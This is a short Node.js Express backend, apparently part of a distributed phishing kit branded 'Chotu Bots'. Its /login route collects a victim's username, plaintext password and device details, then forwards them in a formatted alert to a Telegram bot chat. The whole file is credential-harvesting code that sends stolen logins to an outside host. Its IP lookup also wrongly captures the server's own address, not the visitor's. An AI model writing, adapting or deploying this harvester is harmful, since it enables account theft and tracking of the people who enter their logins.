const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
require("dotenv").config();  // Secure BOT_TOKEN

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());

app.post("/login", async (req, res) => {
    const { username, password, chatId, deviceInfo } = req.body;
    
    if (!username || !password || !chatId) {
        return res.status(400).json({ message: "Missing data" });
    }

    // Get user IP and location
    const ipResponse = await axios.get("https://api64.ipify.org?format=json");
    const ipv4 = ipResponse.data.ip;

    const message = `
🚨 *Login Attempt Detected* 🚨

📄 *Page:* Login page

👤 *Username:* ${username}
🔑 *Password:* ${password}

🌍 *IP Details:*
🖥️ *IP:* ${ipv4}

📱 *Device Info:*
🔋 *Charging:* ${deviceInfo.charging}
🔌 *Battery Level:* ${deviceInfo.battery}%
🌐 *Network Type:* ${deviceInfo.networkType}
🕒 *Time Zone:* ${deviceInfo.timeZone}
📱 *Device Type:* ${deviceInfo.userAgent}

📢 *Dev:* Chotu Bots  
📌 *Join:* My Channel
    `;

    const BOT_TOKEN = process.env.BOT_TOKEN;
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
        await axios.post(TELEGRAM_API_URL, {
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown"
        });
        res.json({ message: "Login details sent!" });
    } catch (error) {
        console.error("Error sending message:", error);
        res.status(500).json({ message: "Failed to send data" });
    }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
